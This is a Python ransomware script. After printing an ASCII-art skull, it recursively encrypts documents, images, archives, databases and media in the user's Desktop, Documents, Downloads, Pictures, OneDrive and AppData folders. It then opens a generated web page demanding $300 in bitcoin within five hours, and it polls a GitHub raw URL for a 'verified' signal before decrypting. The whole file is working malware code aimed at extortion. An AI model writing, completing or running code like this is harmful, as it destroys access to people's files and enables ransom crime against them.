from cryptography.fernet import Fernet
import os
from os.path import expanduser
from threading import Thread
import sys, time
import requests
import numpy as np
print(""".........................................%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&...............................................
.            .   . .    . .. ........(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&.   . .  ...    . .  .     . . .  .... . ..
.            .  ..   . .....  ... %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. . .. .... ..             ..  ..  .....
.              .  ...     .... (@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&. ....      .. ...      ..  .  ... . 
.       .      .. . .  ... . &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.  ..  ....    . .   ...   .   .. .
.                 ...      &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@. ....   .       .   . .. .   .  
.           ..  ... . . .(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ . .. ... .... ... . .  .. .  .
.                      .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(..   . ..        .    .   .  
.   .   .  ... ..  .. (@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&..... . . . .  ... .. ...   
.         .    .   ..&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.... ....    . . .  .. .  .
.        .      ... %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ... .  . ..... ...   ....
.      .     .   ..&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@......... . ...      . . 
.       .  .   ...*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@..... .     ..  ..  .  .
.         ..  ....@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.......... ...   . ... 
.        .  ... .&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@....  .  . .   .   .   
.         . . . .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%............ .  .... .
. . . ... ......@@@@@@@@@@@@@@@@(,......,/%&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@&(,.......*&@@@@@@@@@@@@@@@............... ... ..
.        . .... @@@@@@@@@@@%                        *&@@@@@@@@@@@@@&&@@@@@@@@@@@@#                        ,@@@@@@@@@@@/... ... ...  .. ..  .
..... . .... ..,@@@@@@@@@@                               @@@@@@@@@@@@@@@@@@@@*                              (@@@@@@@@@%..... .  .   .       
.  .. ..........@@@@@@@@@                                 #@@@@@@@@@@@@@@@@@                                 #@@@@@@@@/.. ...   .           
..... ..........*@@@@@@@@#                                 @@@@@&@@@@@@@@@@&                                .@@@@@@@@@... .  .....      .   
. ...............@@@@@@@@@@@                              @@@@@@@@&@@@@@@@@@                              #@@@@@@@@@@&......... .           
... . . ........@@@@%,,,,,,*%@@@*                        &@@@&@@@@@@@@@@@@@@@                        .%@@&*,,,,,,(@@@@........ ..   .       
............../@@*,&@@(///&@@(,*@@@@@&*                &@@@@@&@@@@@@@@@@@@@@@@@/               .#@@@@@#,*&@@#///#@@/,&@@..... ...           
. ...........@@/*@*,%@@@@@@(,*@&,*@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&@@@@@@@@@@@@@,(@#,,@@@@@@&,,@%,@@.. .....   .   .   
.. .........@@,&#,@(,/&@@(,,@&,(@*,@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#,&&,(@(,*&@@#,,@(*@,&@*......   .       
..  .......(@/%#*@,&@@@@@@@&,#@,(@,/@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,@@,%@,(@@@@@@@@,#%*@,@@  .. .. .        
.. ........@@,@,@/(@@@@@@@@@&,@(,@(,@@@@@@@@@@@@@@@@@@@&@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,@/,@*,@@@@@@@@@@,@,&/%@ . ....  .       
...... ....&@,@,@//@@@@@@@@@#,@/,@/,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#,@#,@(,@@@@@@@@@&,@,&/%@.. .... .    .   
...........,@/(#,@,/@@@@@@@(,&&,&@,&@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,(@,/@,*@@@@@@@@,&(*@,@& ..........    . 
............%@,#&,&@,,*/*,,%@(,&@,(@@@@@@@@@@@@@@@@@&&@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&,#@*,@@,,*//,,#@*/@,&@. .........  .  . 
. .........../@(,@&,,&@@@@/,,&@/,&@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*,@@*,,&@@@@/,*@(,@& .......         . 
...............&@#,/@@@&@@@@(,,&@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,/&@@@&@@@#,,@@.....................
.  ..... ........#@@@%/,,,(&@@@@@@@@@@@@@@@&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@%*,,,%@@@@.... .......... ..  .  
. ..................,&@@@@@@@@@@@@@@@&&&@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@(.................. .......
........................@@@&@&@@&@@@@@/ ,(@@@@@@@@@@@@@@@&@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&, ,@@@@@@@@@@@&@@,.............................
.........................@@@@@@@@@@@@@@,, ,#@@@@@@@@@@@@@@@@@@&@&@@@@@@@@@@@@@@@@@@@@@@@@@@,..,@@@@@@@@@@@@@@%..............................
........................./@@@@@@@@@@@@@@@,. ,,&@@@@@@@&@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@/,. ,/@@@@@@@@@@@@@@&...............................
. ..... ..................#@@@@@@@@@@@@@@@#,,  ,,,&@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@/,,   ,,@@@@@@@@@@@@@@@@ ........... ......... .. ......
...........................%@@@@@@@@@@@@@@@@*,.     ,,,,(%@@@@@@@@@@@@@@@@@@&#*,,,.     ,,&@@@@@@@@@@@@@@@@ ................................
........................... %@@@@@@@@@@@@@@@@@,,.            .,,,,,,,,,,,.            ,,#@@@@@@@@@@@@@@@@@..................................
.............................(@@@@@@@@@@@@@@@@@&,,.  .,,,,,,,,,,,,,,,,,,,,,,,,,,,   ,,/@@@@@@@@@@@@@@@@@&...................................
.. ............................@@@@@@@@@@@@@@@@@@/,,,&@@@@@@@@@@@@&@&@@@@@@@@@@@@/,,,@@@@@@@@@@@@@@@@@@#....................................
..   ........ ..................@@@@@@@@@@@@@@@@@,,*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,%@@@@@@@@@@@@@@@@,.....................................
..  ..... .......................(@@@@@@@@@@@@@@%,,@@@@@@@@@@@@@@@@@@@&@@@&@@@@@@@@*,*@@@@@@@@@@@@@@@.......................................
.  .  .  .. .. ...................,@@@@@@@@@@@@@,,(@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@,,@@@@@@@@@@@@@(........................................
.  .  .... ........................ @@@@@@@@@@@&,,@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@,,,@@@@@@@@@@@*.........................................
. .       .... ......................@@@@@@@@@@*,(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,,@@@@@@@@@@...........................................
. . ..... ............................&@@@@@@@&,,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,(@@@@@@@@............................................
.  .   ................................&@@@@@@(,(@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@,,@@@@@@@.............................................
.   ... .   .  .........................@@@@@@,,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,&@@@@@,.............................................
.       ...... . ........................@@@@&,%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,*@@@@(..............................................
.     . .... . ........................... ....#@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@ ... ................................................
.         . ....................................#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@ .....................................................
...       . .....................................,@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@&.......................................................
.         .. . ... ................................(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  .......................................................""")
key = Fernet.generate_key()
home = expanduser("~")
def find(start):
    files_to_encrypt_txt = []
    for dirpath, dirnames, filenames in os.walk(start):
        for filename in filenames:
            if filename.endswith(".txt") or filename.endswith(".gif") or filename.endswith(".png") or filename.endswith(".jpg") or filename.endswith(".docx") or filename.endswith(".pptx") or filename.endswith(".xls") or filename.endswith(".svg") or filename.endswith(".xml") or filename.endswith(".ods") or filename.endswith(".xlsx") or filename.endswith(".wav") or filename.endswith(".zip") or filename.endswith(".rar") or filename.endswith(".7z") or filename.endswith(".csv") or filename.endswith(".dat") or filename.endswith(".db") or filename.endswith(".dbf") or filename.endswith(".sav") or filename.endswith(".sql") or filename.endswith(".mp4"):
                files_to_encrypt_txt.append(os.path.join(dirpath, filename))
    return files_to_encrypt_txt

#encrypt func
def encryptor(files_to_encrypt,key):
    encrypt_token = Fernet(key)
    for file in files_to_encrypt:
        file_ready = open(file,"rb") 
        file_data = file_ready.read()
        data_encrypted = encrypt_token.encrypt(file_data)  
        file_ready.close() 
        file_ready = open(file,"wb") 
        file_ready.write(data_encrypted) 

#decrypt func
def decryptor(files_to_encrypt,key):
    decrypt_token = Fernet(key)
    for file in files_to_encrypt:
        file_ready = open(file,"rb") 
        file_data = file_ready.read()
        data_decrypted = decrypt_token.decrypt(file_data)
        file_ready.close() 
        file_ready = open(file,"wb") 
        file_ready.write(data_decrypted)

#Website Creation
def writeWebsite():
    file = open("website.html","w")
    link = "https://i.pinimg.com/originals/d1/1a/3e/d11a3e1b1ef41798afe10bace2e85c90.gif"
    music = "https://www.mboxdrive.com/MELANCHOLIA%20Music%20Box%20Sad,%20creepy%20song.mp3"
    string = "<!DOCTYPE html><html><head><link href='https://fonts.googleapis.com/css?family=Metal Mania' rel='stylesheet'><iframe src='silence.mp3' allow='autoplay' id='audio' style='display: none'></iframe><audio id='player' autoplay loop><source src='"+music+"' type='audio/mp3'></audio><style>body{background-image: url('"+link+"');background-size: cover;height: 100vh;padding:0;margin:50;}</style></head><body><p style='font-family:Metal Mania;font-size:40px;color:red'><strong>-----LETS PLAY A GAME-----</strong></p><p style='font-family:Metal Mania;font-size:40px;color:red'><strong>YOUR FILES WERE ENCRYPTED:</strong></p><p style='font-family:Metal Mania;font-size:20px;color:red'><strong>IF YOU TURN OFF YOUR PC OR CLOSE ANY FILES RELATABLE TO THE VIRUS YOUR FILES WILL BE LOST...</strong></p><p style='font-family:Metal Mania;font-size:20px;color:red'><strong>TO UNLOCK THE FILES SEND 300$ TO THIS BITCOIN WALLET BELOW WITHIN 5 HOURS OR YOU WILL LOOSE YOUR FILES</strong></p><p style='font-family:Metal Mania;font-size:20px;color:red'><strong>BITCOIN WALLET:</strong></p></body></html>"
    file.write(string)
    file.close()



def main(array,key):
    # t1 = Thread(target=openwebsite)
    
    #t1.start()

    encryptor(array,key)
    while 1:
        r = requests.get('https://raw.githubusercontent.com/master2405/ransomware/main/ransomware_threads')#Your Github Raw Page
        answer = r.text
        if answer.strip() == "verified":
            decryptor(files_to_encrypt_txt,key)
            print("\n"*100)
            print("Thanks for collaboration")
            time.sleep(5)
            sys.exit(0)
        else:
            print("\n"*100)

def main_Main(job,keys):
    files_to_encrypt_txt = find(job)
    main(files_to_encrypt_txt,keys)
    #main(arr_2[x])

#Directories to ecnrypt
start = home+"\\Desktop"
start2 = home+"\\Documents"
start3 = home+"\\Downloads"
start4 = home+"\\Pictures"
start5 = home+"\\OneDrive"
start6 = home +"\\AppData\\Local"
#THREADS
Thread(target=main_Main,args=(start,key)).start()
Thread(target=main_Main,args=(start2,key)).start()
Thread(target=main_Main,args=(start3,key)).start()
Thread(target=main_Main,args=(start4,key)).start()
Thread(target=main_Main,args=(start5,key)).start()
Thread(target=main_Main,args=(start6,key)).start()

writeWebsite()

def openwebsite():
    os.system("website.html")
Thread(target=openwebsite).start()
        


    

    